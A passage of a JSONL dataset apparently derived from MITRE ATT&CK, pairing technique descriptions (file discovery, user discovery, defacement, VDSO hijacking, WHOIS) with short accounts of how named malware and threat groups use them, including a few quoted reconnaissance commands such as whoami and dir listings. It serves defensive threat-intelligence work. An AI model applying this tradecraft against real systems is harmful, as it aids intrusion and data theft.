MSAcpi_ThermalZoneTemperature</code> to check the temperature to see if it’s running in a virtual environment.", "Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.", "EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.\t", "SUNBURST checked the domain name of the compromised host to verify it was running in a real environment.", "GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to <code>c8:27:cc:c2:37:5a</code>.", "Frankenstein has used WMI queries to check if various security applications were running, including VMWare and Virtualbox.", "CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment."], "is_subtechnique": true}
{"text": " Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).", "idx": "https://attack.mitre.org/techniques/T1083", "title": "File and Directory Discovery", "entity": "File and Directory Discovery", "entity_type": "techniques", "entity_context": ["SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time.", "OSX/Shlayer uses the command <code>appDir=\"$(dirname $(dirname \"$currentDir\"))\"</code> and <code>$(dirname \"$(pwd -P)\")</code> to construct installation paths.", "ShimRat can list directories.", "njRAT can browse file systems using a file manager module.", "GrimAgent has the ability to enumerate files and directories on a compromised host.", "FYAnti can search the <code>C:\\Windows\\Microsoft.NET\\</code> directory for files of a specified size.", "LookBack can retrieve file listings from the victim machine.", "Dtrack can list files on available disk volumes.", "Tropic Trooper has monitored files' modified time.\t", "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory. XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running <code>ls -la ~/Library/Application\\ Support/MobileSync/Backup/</code>.", "yty gathers information on victim’s drives and has a plugin for document listing.", "WinMM sets a WH_CBT Windows hook to search for and capture files on the victim.", "BackConfig has the ability to identify folders and files related to previous infections.\t", "3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory.", "NotPetya searches for files ending with dozens of different file extensions prior to encryption.", "ADVSTORESHELL can list files and directories.", "GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.", "Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)", "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the <code>lPH*.dll</code> pattern.", "Sliver can enumerate files on a target system.", "Caterpillar WebShell can search for files in directories. ", "P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.", "Denis has several commands to search directories for files.", "Azorult can recursively search for files in folders and collects files from the desktop with certain extensions.", "Linfo creates a backdoor through which remote attackers can list contents of drives and search for files.", "OceanSalt can extract drive information from the endpoint and search files on the system.", "Penquin can use the command code <code>do_vslist</code> to send file names, size, and status to C2.", "MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"", "ROKRAT has the ability to gather a list of files and directories on the infected system.", "APT38 have enumerated files and directories, or searched in specific locations within a compromised host.", "A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.", "Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. Rising Sun can enumerate the compilation timestamp of Windows executable files.\t", "NDiskMonitor can obtain a list of all files and directories as well as logical drives.", "Ixeshe can list file and directory information.", "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: <code>dir c:\\ >> %temp%\\download</code> <code>dir \"c:\\Documents and Settings\" >> %temp%\\download</code> <code>dir \"c:\\Program Files\\\" >> %temp%\\download</code> <code>dir d:\\ >> %temp%\\download</code>", "Volgmer can list directories on a victim.", "GoldenSpy has included a program \"ExeProtector\", which monitors for the existence of GoldenSpy on the infected system and redownloads if necessary.\t", "Honeybee's service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.", "Cryptoistic can scan a directory to identify files for deletion.", "PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.", "Conti can discover files on a local system.", "Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.", "A variant of Elise executes <code>dir C:\\progra~1</code> when initially run.", "BlackMould has the ability to find files on the targeted system.", "TSCookie has the ability to discover drive information on the infected host.", "Zeus Panda searches for specific directories on the victim’s machine.", "Orz can gather victim drive information.", "Kwampirs collects a list of files and directories in C:\\ with the command <code>dir /s /a c:\\ >> \"C:\\windows\\TEMP\\RANDOM.tmp\"</code>.", "Pisloader has commands to list drives on the victim machine and to list file information for a given directory.", "RedLeaves can enumerate and search for files and directories.", "TYPEFRAME can search directories for files on the victim’s machine.", "RTM can check for specific files and directories associated with virtualization and malware analysis.", "DEATHRANSOM can use loop operations to enumerate directories on a compromised host.", "SHOTPUT has a command to obtain a directory listing.", "SUNSPOT enumerated the Orion software Visual Studio solution directory path.", "MESSAGETAP checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.", "Lokibot can search for specific files on an infected host.", "Ebury can list directory entries. ", "Gold Dragon lists the directories for Desktop, program files, and the user’s recently accessed files.", "NETWIRE has the ability to search for files on the compromised host.", "PoetRAT has the ability to list files upon receiving the <code>ls</code> command from C2.", "Rover automatically searches for files on local drives based on a predefined list of file extensions.", "AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.", "NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.", "POWRUNER may enumerate user directories on a victim.", "Avaddon has searched for specific files prior to encryption.", "Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims.", "MegaCortex can parse the available drives and directories to determine which files to encrypt. ", "HOPLIGHT has been observed enumerating system drives and partitions.\t", "KeyBoy has a command to launch a file browser or explorer on the system.", "Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).", "DropBook can collect the names of all files and folders in the Program Files directories. ", "Bazar can enumerate the victim's desktop.", "InvisiMole can list information about files in a directory and recently opened or used documents. InvisiMole can also search for specific files by supplied file mask.", "Kinsing has used the find command to search for specific files.", "Dark Caracal collected file listings of all default Windows directories.", "Chimera has utilized multiple commands to identify data of interest in file and directory listings.", "REvil has the ability to identify specific files and directories that are not to be encrypted.", "WannaCry searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.", "A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.", "SynAck checks its directory location in an attempt to avoid launching in a sandbox.", "FALLCHILL can search files on a victim.", "RemoteUtilities can enumerate files and directories on a target machine.", "ZxShell has a command to open a file manager and explorer on the system. ", "TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.", "Pasam creates a backdoor through which remote attackers can retrieve lists of files.", "GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.", "SOUNDBITE is capable of enumerating and manipulating files and directories.", "Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.\t", "Fox Kitten has used WizTree to obtain network files and directory listings.", "Okrum has used DriveLetterView to enumerate drive information.", "Trojan.Karagany can enumerate files and directories on a compromised host.", "FinFisher enumerates directories and scans for certain files.", "Cannon can obtain victim drive information as well as a list of folders in C:\\Program Files.", "FruitFly looks for specific files and file types.", "Babuk has the ability to enumerate files on a targeted system.", "Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.", "Cuba can enumerate files by using a variety of functions.", "Turian can search for specific files and list directories.", "Remexi searches for files on the system. ", "APT29 obtained information about the configured Exchange virtual directory using <code>Get-WebServicesVirtualDirectory</code>.", "WastedLocker can enumerate files and directories just prior to encryption.", "Bankshot searches for files on the victim's machine.", "BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.", "Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.", "SLOTHFULMEDIA can enumerate files and directories.", "FatDuke can enumerate directories on target machines.", "APT3 has a tool that looks for files and directories on the local file system.", "Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.", "PLEAD has the ability to list drives and files on the compromised host.", "Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.", "QakBot can identify whether it has been run previously on a host by checking for a specified folder.", "MiniDuke can enumerate local drives.", "cmd can be used to find files and directories with native functionality such as <code>dir</code> commands.", "PlugX has a module to enumerate drives and find files recursively.", "Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.", "KEYMARBLE has a command to search for files on the victim’s machine.", "CookieMiner has looked for files in the user's home directory with \"wallet\" in their name using <code>find</code>.", "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.", "MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.", "Pupy can walk through directories and recursively search for strings in files.", "Several Lazarus Group malware samples use a common function to identify target files by their extension. Lazarus Group malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.", "Kasidet has the ability to search for a given filename on a victim.", "Dragonfly 2.0 used a batch script to gather folder and file names from victim hosts.", "Bisonal can retrieve a file list of a specified folder.", "Bandook has a command to list files on a system.", "CrossRAT can list all files on a system.", "Aria-body has the ability to gather metadata from a file and to search for file and directory names.", "Machete produces file listings in order to search for files to be exfiltrated.", "Stuxnet uses a driver to scan for specific filesystem driver objects.", "Nebulae can list files and directories on a compromised host.", "KillDisk has used the <code>FindNextFile</code> command as part of its file deletion process.", "AuditCred can search through folders and files on the system.", "DDKONG lists files on the victim’s machine.", "4H RAT has the capability to obtain file and directory listings.", "USBferry can detect the victim's file or folder list.\t", "POORAIM can conduct file browsing.", "TAINTEDSCRIBE can use <code>DirectoryList</code> to enumerate files in a specified directory.", "A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.", "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.", "CORALDECK searches for specified files.", "Darkhotel has used malware that searched for files with specific patterns.", "BADFLICK has searched for files on the infected host.", "Ramsay can collect directory and file lists.\t", "Sandworm Team has enumerated files on a compromised host.", "RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.", "Attor has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.", "Taidoor can search for specific files.", "TajMahal has the ability to index files from drives, user profiles, and removable drives.", "Proxysvc lists files in directories.", "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.", "BoomBox can search for specific files and directories on a machine.", "Empire includes various modules for finding files of interest on hosts and network shares.", "Peppy can identify specific files for exfiltration.", "Octopus can collect information on the Windows directory and searches for compressed RAR files on the host.", "UPPERCUT has the capability to gather the victim's current directory.", "BadPatch searches for files with specific file extensions.", "ZLib has the ability to enumerate files and drives.", "Pteranodon identifies files matching certain file extension and copies them to subdirectories it created.", "Ke3chang uses command-line interaction to search files and directories.", "PoshC2 can enumerate files on the local file system and includes a module for enumerating recently accessed files.", "SideTwist has the ability to search for specific files.", "JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe.", "Avenger has the ability to browse files in directories such as Program Files and the Desktop. ", "StrongPity can parse the hard drive on a compromised host to identify specific file extensions.", "SDBbot has the ability to get directory listings or drive information on a compromised host.", "ObliqueRAT has the ability to recursively enumerate files on an infected endpoint.", "Smoke Loader recursively searches through directories for files.", "Dust Storm has used Android backdoors capable of enumerating specific files on the infected devices.", "Sidewinder has used malware to collect information on files and directories.", "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.", "RainyDay can use a file exfiltration tool to collect recently changed files with specific extensions.", "Kazuar finds a specified directory, lists the files and metadata about those files.", "AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.", "Derusbi is capable of obtaining directory, file, and drive listings.", "SombRAT can execute <code>enum</code> to enumerate files in storage on a compromised system.", "Micropsia can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.", "BLINDINGCAN can search, read, write, move, and execute files.", "HotCroissant has the ability to retrieve a list of files in a given directory as well as drives and drive types.", "Skidmap has checked for the existence of specific files including <code>/usr/sbin/setenforce</code> and <code> /etc/selinux/config</code>. It also has the ability to monitor the cryptocurrency miner file and process.  ", "BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.", "USBStealer searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.", "BACKSPACE allows adversaries to search for files.", "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.", "ChChes collects the victim's %TEMP% directory path and version of Internet Explorer.", "MoonWind has a command to return a directory listing for a specified directory.", "InnaputRAT enumerates directories and obtains file attributes on a system.", "HTTPBrowser is capable of listing files, folders, and drives on a victim.", "SUNBURST had commands to enumerate files and directories.", "Doki has resolved the path of a process PID to use as a script argument.", "FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.", "BLACKCOFFEE has the capability to enumerate files.", "Seasalt has the capability to identify the drive type on a victim.", "Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.", "APT32's backdoor possesses the capability to list files and directories on a machine. \t\n", "BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types.", "jRAT can browse file systems.", "CrackMapExec can discover specified filetypes and log files on a targeted system.", "BBSRAT can list file and directory information.", "Operation Wocao has gathered a recursive directory listing to find files and directories of interest.", "ELMER is capable of performing directory listings.", "Ryuk has called <code>GetLogicalDrives</code> to emumerate all mounted drives, and <code>GetDriveTypeW</code> to determine the drive type.", "menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.", "MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.", "Inception used a file listing plugin to collect information about file and directories both on local and remote drives.", "Cobalt Strike can explore files on a compromised system.", "Fysbis has the ability to search for files. ", "WindTail has the ability to enumerate the users home directory and the path to its own application bundle.", "down_new has the ability to list the directories on a compromised host.", "Brave Prince gathers file and directory information from the victim’s machine.", "Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. Zebrocy also runs the <code>echo %APPDATA%</code> command to list the contents of the directory. Zebrocy can obtain the current execution path as well as perform drive enumeration. ", "Kimsuky has the ability to enumerate all the drives on an infected system.", "APT41 has executed <code>file /bin/pwd</code> on exploited victims, perhaps to return architecture related information.", "Metamorfo has searched the Program Files directories for specific folders and has searched for strings related to its mutexes. ", "APT18 can list files information for specific directories.", "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.", "Windigo has used a script to check for the presence of files created by OpenSSH backdoors.", " Siloscape searches for the Kubernetes config file and other related files using a regular expression. ", "Kivars has the ability to list drives on the infected host.", "APT39 has used tools with the ability to search for files on a compromised host.", "KGH_SPY can enumerate files and directories on a compromised host.", "PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list.", "Imminent Monitor has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.", "DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.", "OwaAuth has a command to list its directory and logical drives.", "Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.", "BabyShark has used <code>dir</code> to search for \"programfiles\" and \"appdata\".\t", "Dacls can scan directories on a compromised host.", "SoreFang has the ability to list directories.", "Remcos can search for files on the infected machine.", "Industroyer’s data wiper component enumerates specific files on all the Windows drives.", "zwShell can browse the file system.", "CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list.", "BLUELIGHT can enumerate files and collect associated metadata.", "BoxCaon has searched for files on the system, such as documents located in the desktop folder.", "Clop has searched folders and subfolders for files to encrypt.", "China Chopper's server component can list directory contents.", "StreamEx has the ability to enumerate drive types.", "WINERACK can enumerate files and directories."], "is_subtechnique": false}
{"text": " An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)", "idx": "https://attack.mitre.org/techniques/T1491/002", "title": "External Defacement", "entity": "External Defacement", "entity_type": "techniques", "entity_context": ["Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.", "Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019."], "is_subtechnique": true}
{"text": " **This technique has been deprecated and should no longer be used.** The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual) Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.", "idx": "https://attack.mitre.org/techniques/T1153", "title": "Source", "entity": "Source", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.", "idx": "https://attack.mitre.org/techniques/T1033", "title": "System Owner/User Discovery", "entity": "System Owner/User Discovery", "entity_type": "techniques", "entity_context": ["NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel.", "Magic Hound malware has obtained the victim username and sent it to the C2 server.", "MechaFlounder has the ability to identify the username and hostname on a compromised host.", "Epic collects the user name from the victim’s machine.", "SombRAT can execute <code>getinfo</code>  to identify the username on a compromised host.", "An APT3 downloader uses the Windows command <code>\"cmd.exe\" /C whoami</code> to verify that it is running with the elevated privileges of “System.”", "FELIXROOT collects the username from the victim’s machine.", "Bonadan has discovered the username of the user running the backdoor.", "APT39 used Remexi to collect usernames from the system.", "Micropsia collects the username from the victim’s machine.", "yty collects the victim’s username.", "ServHelper will attempt to enumerate the username of the victim.", "Dragonfly 2.0 used the command <code>query user</code> on victim hosts.", "RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions.", "Mosquito runs <code>whoami</code> on the victim’s machine.", "Unknown Logger can obtain information about the victim usernames.", "Cryptoistic can gather data on the user of a compromised host.", "Aria-body has the ability to identify the username on a compromised host.", "Sidewinder has used tools to identify the user of a compromised host.", "WINERACK can gather information on the victim username.", "SHARPSTATS has the ability to identify the username on the compromised host.", "Cannon can gather the username from the system.", "NBTscan can list active users on the system.\t", "Agent.btz obtains the victim username and saves it to a file.", "UPPERCUT has the capability to collect the current logged on user’s username from a machine.", "JPIN can obtain the victim user name.", "SLOTHFULMEDIA has collected the username from a victim machine.", "WinMM uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.", "NanHaiShu collects the username from the victim.", "Octopus can collect the username from the victim’s machine.", "PowerDuke has commands to get the current user's name and SID.", "APT37 identifies the victim username.", "GALLIUM used <code>whoami</code> and <code>query user</code> to obtain information about the victim user.", "RATANKBA runs the <code>whoami</code> and <code>query user</code> commands.", "Koadic can identify logged in users across the domain and views user sessions.", "WellMess can collect the username on the victim machine to send to C2.", "Lucifer has the ability to identify the username on a compromised host.", "NOKKI can collect the username from the victim’s machine.", "Reaver collects the victim's username.", "Sandworm Team has collected the username from a compromised host.", "njRAT enumerates the current user during the initial infection.", "KONNI can collect the username from the victim’s machine.", "MarkiRAT can retrieve the victim’s username.", "POWRUNER may collect information about the currently logged in user by running <code>whoami</code> on a victim.", "Bazar can identify the username of the infected user.", "LiteDuke can enumerate the account name on a targeted system.", "VERMIN gathers the username from the victim’s machine.", "Exaramel for Linux can run <code>whoami</code> to identify the system owner.", "SideTwist can collect the username on a targeted system.", "SDBbot has the ability to identify the user on a compromised host.", "RTM can obtain the victim username and permissions.", "BISCUIT has a command to gather the username from the system.", "Grandoreiro can collect the username from the victim's machine.", "Mis-Type runs tests to determine the privilege level of the compromised user.", "Rifdoor has the ability to identify the username on the compromised host.", "Wizard Spider has used \"whoami\" to identify the local user and their privileges.", "Zebrocy gets the username from the system.", "WellMail can identify the current username on the victim system.", "Tropic Trooper used <code>letmein</code> to scan for saved usernames on the target system.", "RogueRobin collects the victim’s username and whether that user is an admin.", "A module in Prikormka collects information from the victim about the current user name.", "RGDoor executes the <code>whoami</code> on the victim’s machine.", "Explosive has collected the username from the infected host. ", "Remsec can obtain information about the current user.", "Chaes has collected the username and UID from the infected machine.", "Frankenstein has enumerated hosts, gathering username, machine name, and administrative permissions information.", "FIN10 has used Meterpreter to enumerate users on remote systems.", "MuddyWater has used malware that can collect the victim’s username.", "Felismus collects the current username and sends it to the C2 server.", "ZxShell can collect the owner and organization information from the target workstation. ", "MoonWind obtains the victim username.", "POWERSTATS has the ability to identify the username on the compromised host.", "Agent Tesla can collect the username from the victim’s machine.", "Revenge RAT gathers the username from the system.", "Spark has run the whoami command and has a built-in command to identify the user logged in. ", "HotCroissant has the ability to collect the username on the infected host.", "MirageFox can gather the username from the victim’s machine.", "Okrum can collect the victim username.", "Denis enumerates and collects the username from the victim’s machine.", "Get2 has the ability to identify the current username of an infected host.", "GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status).", "ObliqueRAT can check for blocklisted usernames on infected endpoints.", "Turian can retrieve usernames.", "Azorult can collect the username from the victim’s machine.", "SodaMaster can identify the username on a compromised host.", "Valak can gather information regarding the user.", "Cardinal RAT can collect the username from a victim machine.", "XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user.", "QUADAGENT gathers the victim username.", "DarkComet gathers the username from the victim’s machine.", "Sys10 collects the account name of the logged-in user and sends it to the C2.", "BoomBox can enumerate the username on a compromised host.", "Lokibot has the ability to discover the username on the infected host.", "BloodHound can collect information on user sessions.", "InvisiMole lists local users and session information.", "Stealth Falcon malware gathers the registered user and primary owner name via WMI.", "QakBot can identify the user name on a compromised system.", "Gazer obtains the current user's security identifier.", "Chimera has used the <code>quser</code> command to show currently logged on users. ", "T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.", "Operation Wocao has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.", "Caterpillar WebShell can obtain a list of user accounts from a victim's machine.", "ShadowPad has collected the username of the victim system.", "SynAck gathers user names from infected hosts.", "Rising Sun can detect the username of the infected host.\t", "GrimAgent can identify the user id on a target machine.", "can collect the victim user name.", "TrickBot can identify the user and groups the user belongs to on a compromised host.", "PoetRAT sent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2.", "OilRig has run <code>whoami</code> on a victim.", "Trojan.Karagany can gather information about the user on a compromised host.", "Goopy has the ability to enumerate the infected system's user name.", "Windshift has used malware to identify the username on a compromised host.", "SslMM sends the logged-on username to its hard-coded C2.", "Crimson can identify the user on a targeted system.", "Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. ", "Kazuar gathers information on users.", "More_eggs has the capability to gather the username from the victim's machine.", "Egregor has used tools to gather information about users.", "Ixeshe collects the username from the victim’s machine.", "Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.", "Various Lazarus Group malware enumerates logged-on users.", "Dyre has the ability to identify the users on a compromised host.", "Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.", "Metamorfo has collected the username from the victim's machine. ", "WINDSHIELD can gather the victim user name.", "The OsInfo function in Komplex collects the current running username.", "PowerShower has the ability to identify the current user on the infected host.", "ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.", "FlawedAmmyy enumerates the current user during the initial infection.", "APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.", "EVILNUM can obtain the username from the victim's machine.", "Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.", "HAWKBALL can collect the user name of the system.", "Backdoor.Oldrea collects the current username from the victim.", "SMOKEDHAM has used <code>whoami</code> commands to identify system owners.", "A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.", "SpeakUp uses the <code>whoami</code> command. ", "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.", "APT32 collected the victim's username and executed the <code>whoami</code> command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine. ", "DownPaper collects the victim username and sends it to the C2 server.", "APT41 used the WMIEXEC utility to execute <code>whoami</code> commands on remote machines.", "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim.", "Kwampirs collects registered owner details by using the commands <code>systeminfo</code> and <code>net config workstation</code>.", "zwShell can obtain the name of the logged-in user on the victim.", "SUNBURST collected the username from a compromised host.", "BLUELIGHT can collect the username on a compromised host.", "BabyShark has executed the <code>whoami</code> command."], "is_subtechnique": false}
{"text": " Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009) (Citation: Backtrace VDSO) (Citation: VDSO Aug 2005) (Citation: Syscall 2014) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/014", "title": "VDSO Hijacking", "entity": "VDSO Hijacking", "entity_type": "techniques", "entity_context": ["Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. "], "is_subtechnique": true}
{"text": " Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS) Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1596/002", "title": "WHOIS", "entity": "WHOIS", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
